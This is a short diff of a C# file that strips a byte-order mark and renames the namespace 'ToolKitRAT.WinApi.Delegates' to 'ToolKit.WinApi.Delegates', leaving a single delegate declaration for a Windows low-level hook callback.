@@ -1,5 +1,5 @@
-﻿using System;
+using System;
 
-namespace ToolKitRAT.WinApi.Delegates {
+namespace ToolKit.WinApi.Delegates {
     public delegate IntPtr LowLevelHookCallback(int nCode, IntPtr wParam, IntPtr lParam);
 }
